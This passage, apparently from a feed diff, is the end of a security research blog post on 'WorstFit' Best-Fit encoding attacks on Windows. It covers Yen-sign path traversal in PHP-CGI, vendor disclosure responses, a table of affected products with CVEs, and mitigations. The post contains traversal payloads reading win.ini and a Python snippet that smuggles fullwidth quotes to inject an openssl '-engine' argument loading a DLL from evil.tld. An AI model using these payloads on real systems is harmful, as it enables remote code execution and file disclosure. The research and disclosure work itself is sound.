+&lt;p&gt;After the web server (e.g., IIS, Apache, or another PHP-CGI-compatible server) processes it, it generates several environment variables. Depending on the server, these might look like this in Apache:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;REDIRECT_URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
+&lt;span class=&quot;nv&quot;&gt;REQUEST_URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
+&lt;span class=&quot;nv&quot;&gt;PATH_INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/index.php/foo/bar
+&lt;span class=&quot;nv&quot;&gt;PATH_TRANSLATED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;ndex.php&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;oo&lt;span class=&quot;se&quot;&gt;\b&lt;/span&gt;ar
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Notice how the PHP script filename (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the additional path (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foo/bar&lt;/code&gt;) are combined. From the environment variables alone, it’s unclear which part represents the PHP file and which is additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt;. Resolving this ambiguity is left to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;. Hmm, it must be quite easy to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; confused right?&lt;/p&gt;
+
+&lt;p&gt;The first thought might be to try something like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://victim.tld/index.php/../../../secret.txt&lt;/code&gt;. But this apparently won’t work, as the web server normalizes and validates paths before passing them to PHP-CGI. So, how can we bypass this?&lt;/p&gt;
+
+&lt;p&gt;As we knew in the &lt;strong&gt;Filename Smuggling&lt;/strong&gt; section, the Yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;¥&lt;/code&gt;) in the Japanese code page can be exploited. For example, by sending a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥windows/win.ini/foo&lt;/code&gt;, you can potentially access arbitrary files. Here’s how it works:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Web Server’s Perspective&lt;/strong&gt;: The server treats the entire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..¥..¥windows/win.ini/foo&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and processes it as part of the request.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;PHP-CGI’s Perspective&lt;/strong&gt;: PHP-CGI receives things like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;REQUEST_URI=/index.php/..\..\windows/win.ini/foo&lt;/code&gt; and struggles to differentiate between the actual PHP file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;) and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; portion. This confusion allows the exploit to manipulate the behavior and access files beyond intended restrictions.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This mismatch between how components interpret the request opens the door to potential vulnerabilities. Depending on the web server’s behavior and configuration, this can turn into a file existence oracle on &lt;strong&gt;Apache&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Non-existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥NONEXIST/&lt;/code&gt;, PHP-CGI treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/..¥..¥NONEXIST/&lt;/code&gt; as additional &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH_INFO&lt;/code&gt; and renders &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php&lt;/code&gt; as usual.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Existing file&lt;/strong&gt;: For a request like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥windows/win.ini/&lt;/code&gt;, PHP-CGI fails and produces a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No input file specified&lt;/code&gt; error due to how it handles valid files internally.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But why stop at just checking file existence? On an &lt;strong&gt;IIS server&lt;/strong&gt; with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doc_root&lt;/code&gt; directive configured, this can lead to &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;. Using a path like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/..¥..¥..¥windows/win.ini/&lt;/code&gt;, you can effectively include and read arbitrary files, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows\win.ini&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As an LFI vulnerability, this can surely escalate to a potential &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt; in scenarios where the included file contains executable or user-controllable code.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This specific scenario is rare in real-world applications, so we classify it more as a bug rather than a vulnerability.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;the-duskor-dawnof-the-worstfit&quot;&gt;The Dusk–or Dawn–of the WorstFit&lt;/h2&gt;
+
+&lt;p&gt;As mentioned earlier, we have identified several issues across programming languages, open-source projects, and Windows built-in command-line programs. As responsible researchers, we promptly reported these issues to their respective upstream maintainers. However, this process was quite challenging, the most debated topic is revolved around the &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and this section highlights some obstacles we encountered during the reporting process.&lt;/p&gt;
+
+&lt;h4 id=&quot;-is-this-an-issue&quot;&gt;🧐 &lt;strong&gt;Is this an issue?&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;This was the most common question raised by vendors. Those in opposition argued that “passing user inputs to the command line in itself is already a vulnerability”. Even they are properly escaped or have sanitization in place, the root of the problem is still that “developers should avoid such practices altogether”.&lt;/p&gt;
+
+&lt;p&gt;I am not sure if it’s fair to shift all the responsibility onto developers. Firstly, the operating system itself is already a scenario that highly requires user inputs. Additionally, with the increasing complexity of web applications, it is really difficult to completely eliminate user input.&lt;/p&gt;
+
+&lt;h4 id=&quot;-who-is-responsible-for-that&quot;&gt;🧐 &lt;strong&gt;Who is responsible for that?&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;Even if we both agree that this is an issue, the next much challenging question is: “Who is responsible for it?” Since the problematic code are embedded automatically during compilation (the compiler attaches the entry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mainCRTStartup()&lt;/code&gt;, which calls the ANSI API within MSVCRT/UCRT), the responsibility becomes unclear. Is it because &lt;strong&gt;“the developer failed to use the correct &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt;”&lt;/strong&gt;, or is it &lt;strong&gt;“CRT’s failure for not splitting the command line well and pass the wrong argument to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;”&lt;/strong&gt;?&lt;/p&gt;
+
+&lt;p&gt;To make things even more confusing, some projects only provide source code, leaving the prebuilt executable files distributed to be handled by third-party volunteers across the Internet. In such cases, who should be held accountable for the issue? Taking it a step further, could this even be considered a case of &lt;a href=&quot;https://en.wikipedia.org/wiki/Backdoor_(computing)#Compiler_backdoors&quot;&gt;compiler-introduced security vulnerabilities&lt;/a&gt;? 😉&lt;/p&gt;
+
+&lt;h4 id=&quot;-its-really-hard-to-fix-it&quot;&gt;😖 &lt;strong&gt;It’s really hard to fix it!&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;p&gt;I believe most maintainers would be willing to help with a quick fix, even if it wasn’t categorized as a security issue. However, resolving this problem isn’t that as simple as just replacing the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main()&lt;/code&gt;&lt;/strong&gt; with its wide-character counterpart. Since the function signature has been changed, maintainers would need to rewrite all variable definitions and argument parsing logics, converting everything from simple &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;char *&lt;/code&gt;&lt;/strong&gt; to &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wchar_t *&lt;/code&gt;&lt;/strong&gt;. This process can be painful and error-prone. 😵‍💫&lt;/p&gt;
+
+&lt;p&gt;We have also summarized some responses we received as follows:&lt;/p&gt;
+
+&lt;h4 id=&quot;-curl&quot;&gt;➤ Curl&lt;/h4&gt;
+
+&lt;p&gt;Curl said that this is a Windows feature and there are no plans to fix it. Interestingly, Microsoft’s &lt;a href=&quot;https://curl.se/windows/microsoft.html&quot;&gt;ported Curl&lt;/a&gt; has properly modified the entry to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wmain()&lt;/code&gt; on the contrary, so the built-in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl.exe&lt;/code&gt; on Windows is not impacted, only the binaries delivered by official  Curl are affected by the Argument Splitting attack.&lt;/p&gt;
+
+&lt;p&gt;Here are some responses from Curl. You can check the full report on &lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;HackerOne&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I’m struggling to see how this is a curl problem. It looks like a Windows “feature” to me. It is being “helpful” and helps users to convert ascii-looking double quotes to ASCII double quotes.&lt;/p&gt;
+
+  &lt;p&gt;— 👤 Author of Curl&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;If we can mitigate this we should probably consider that, but it is a hard problem and it certainly is not going to be solved in the short term. curl is a victim here, not the responsible party.&lt;/p&gt;
+
+  &lt;p&gt;— 👤 Author of Curl&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;-openssl&quot;&gt;➤ OpenSSL&lt;/h4&gt;
+
+&lt;p&gt;This is an interesting case. OpenSSL provides an environment variable, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPENSSL_WIN32_UTF8&lt;/code&gt;, to handle arguments in Wide Character format. Although its original purpose was to correct issues with displaying UTF-8 in the UI, it also mitigates the Argument Splitting attack unintentionally!&lt;/p&gt;
+
+&lt;p&gt;However, most developers are still unaware of the need to set this environment variable while using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt; executable. As a result,it is still possible to leverage the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-engine&lt;/code&gt; argument to execute arbitrary code in a default OpenSSL usage.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pass&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-engine&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\uFF02\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;evil.tld&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;malicious.dll&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&apos;openssl.exe&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;&quot;enc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;&quot;-aes-256-cbc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;&quot;-in&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;in.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;&quot;-out&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;out.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+    &lt;span class=&quot;s&quot;&gt;&quot;-k&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passphrase&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;-perl&quot;&gt;➤ Perl&lt;/h4&gt;
+
+&lt;p&gt;The official Perl did not provide prebuilt executables for Windows. Instead, third-party installers such as &lt;a href=&quot;https://strawberryperl.com/&quot;&gt;Strawberry Perl&lt;/a&gt; or &lt;a href=&quot;https://www.activestate.com/products/perl/&quot;&gt;ActiveState Perl&lt;/a&gt; are commonly used, and both of which are affected by the Argument Splitting attack. After having a discuss with the Perl maintainer, they concluded that &lt;strong&gt;“This seems more like a Microsoft bug than a Perl bug,”&lt;/strong&gt; so this issue remains unresolved in Perl for now.&lt;/p&gt;
+
+&lt;h4 id=&quot;-microsoft&quot;&gt;➤ Microsoft&lt;/h4&gt;
+
+&lt;p&gt;We reported three cases to MSRC in total, but the communication process did not go well. All cases were initially rejected for not meeting their severity criteria. We re-opened the case several times and the Excel case was eventually accepted after our third attempt, while the other cases remain unresolved for today :(&lt;/p&gt;
+
+&lt;p&gt;Here is the reply:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The attack scenario here depends on a vulnerability in an unrelated application. The trick inherently requires a separate application that inserts untrusted input into a command line which is then executed. That in itself is a vulnerability; however, the technique which makes exploiting the issue possible does not qualify as a vulnerability.
+— 👤 MSRC&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;-report-to-certcc&quot;&gt;➤ Report to CERT/CC&lt;/h4&gt;
+
+&lt;p&gt;Since this is a systemic problem, we have also sought assistance from CERT/CC, hoping to coordinate and collaborate in an effort to find a better solution to address this issue. Microsoft eventually added one more &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea#security-remarks&quot;&gt;warning&lt;/a&gt; in their documentation after several months of effort. However, they only put this warning in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetCommandLineA&lt;/code&gt;. There are still several ANSI APIs that need attention! ¯\_(ツ)_/¯&lt;/p&gt;
+
+&lt;p&gt;During the process of the vulnerability disclosure, we also investigated the open-source ecosystem to identify more affected applications, and tried to report them to their maintainers. Here is a list of what we have reported so far:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Report Date&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Vendor&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Status&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/05/07&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;PHP - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;CVE-2024-4577&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/13&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Curl - &lt;a href=&quot;https://curl.se/windows/&quot;&gt;Official Build&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://hackerone.com/reports/2550951&quot;&gt;Won’t Fix&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/16&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Tar - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft Excel - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;excel.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49026&quot;&gt;CVE-2024-49026&lt;/a&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Microsoft PhoneBook - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rasphone.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/08/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;GNU Wget&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;No Reply&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/13&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Apache Subversion - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svn.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;CVE-2024-45720&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/08/05&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;PostgreSQL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psql.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/08/08&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Putty - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plink.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Fixed&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/07/15&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Perforce - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p4.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;CVE-2024-8067&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Oracle Java - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Pending Fix&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/06/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Perl - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;perl.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Won’t Fix&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/08/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSL - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;openssl.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Other&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;2024/08/19&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;wkhtmltopdf - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wkhtmltopdf.exe&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;EOL&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h2&gt;
+
+&lt;p&gt;So far, we have summarized attacks on WorstFit, including &lt;strong&gt;Filename Smuggling&lt;/strong&gt;, &lt;strong&gt;Argument Splitting&lt;/strong&gt;, and &lt;strong&gt;Environment Variable Confusion&lt;/strong&gt;. Each attack has its applicable Code Pages. You can check the following table to see if you are at risk or not.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;↓ Table of Affected Code Pages:&lt;/em&gt;
+&lt;img src=&quot;/assets/img/blog/20250109/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;↓ World Map of WorstFit:&lt;/em&gt;
+&lt;img src=&quot;/assets/img/blog/20250109/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;mitigations&quot;&gt;Mitigations&lt;/h3&gt;
+
+&lt;p&gt;As for how to mitigate such attacks, unfortunately, since this is an operating system-level problem, similar issues will continue to reappear — until Microsoft chooses to enable UTF-8 by default in all of their Windows editions. Before that, the only thing we can do is to encourage everyone, the users, organizations, and developers, to gradually phase out ANSI and promote the use of the Wide Character API, transiting the environment to a safer world step by step!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;As a user&lt;/strong&gt;, the only thing you can do is to check the UTF-8 option on your Windows. However, since this feature is still in the BETA phase, it’s uncertain whether it will cause side effects or not.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;As a developer&lt;/strong&gt;, please use the Wide Character API as much as possible. As well as the C Runtime Library, they also provide the wide character versions, such as &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getcwd-wgetcwd?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetcwd&lt;/code&gt;&lt;/a&gt; and &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv?view=msvc-170&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_wgetenv&lt;/code&gt;&lt;/a&gt;. Otherwise, the implementation of the underlying implementation still call the ANSI API, which is vulnerable to our WorstFit attacks, too!&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;We hope this article provides you with an overview and enough insights to understand WorstFit Attack. Of course, this is not the end. Considering Windows’ commitment towards backward compatibility, you can imagine there are more hidden places the ANSI API would appear, for example, the Windows Registry queries like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RegQueryValueA&lt;/code&gt; are definitely affected but need to find a vulnerable scenario, and we also observed Best-Fit behavior in Active Directory! 😉&lt;/p&gt;
+
+&lt;p&gt;We encourage more researchers to explore this attack surface and look forward to see more vulnerabilities in the future!&lt;/p&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>DEVCORE 2025 第七屆實習生計畫</title>
